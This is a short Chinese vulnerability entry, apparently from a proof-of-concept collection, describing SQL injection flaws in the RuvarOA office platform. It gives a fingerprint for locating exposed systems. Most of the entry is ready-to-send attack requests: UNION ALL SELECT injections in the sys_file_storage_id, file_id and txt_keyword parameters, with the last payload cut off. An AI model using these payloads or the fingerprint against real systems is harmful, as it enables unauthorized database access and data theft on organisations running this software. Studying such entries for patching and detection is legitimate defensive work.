# RuvarOA协同办公平台12处存在SQL注入漏洞

- **系统**：RuvarOA　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`body="txt_admin_key"`
- **请求**：`GET /DepartmentPlan/department_plan_attach_download.aspx?sys_file_storage_id=%27%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CCHAR%28113%29%2bCHAR%28106%29%2bCHAR%28118%29%2bCHAR%2898%29%2bCHAR%28113%29%2bCHAR%2873%29%2bCHAR%28107%29`

**请求体 / payload**
```
1、
Host:
2、
GET /filemanage/file_memo.aspx?file_id=@@version HTTP/1.1
Host:
3、
POST /ContractManage/get_company.aspx HTTP/1.1
Host:
Content-Type: application/x-www-form-urlencoded
Content-Length: 495
__EVENTTARGET=&__EVENTARGUMENT=&__LASTFOCUS=&__VIEWSTATE=%2FwEPDwULLTE2NjkyODU1NDAPZBYCAgMPZBYGAgEPEGQPFgFmFgEQBQzpgInmi6nliIbnsbtlZxYBZmQCCQ88KwALAQAPFggeCERhdGFLZXlzFgAeC18hSXRlbUNvdW50Zh4JUGFnZUNvdW50AgEeFV8hRGF0YVNvdXJjZUl0ZW1Db3VudGZkZAILDw8WAh4RUGFnZXJfUmVjb3JkY291bnRmZGRkjBOPpsjzfyKuMGne7EKY2cnc17Zi99ZVNb4cfmiP0Z0%3D&ddl_type=&ddl_field=dw_bh&txt_keyword=1'+UNION+ALL+SELECT+@@version--+CwAf…（脚本共 1661 字，完整版见原文）
```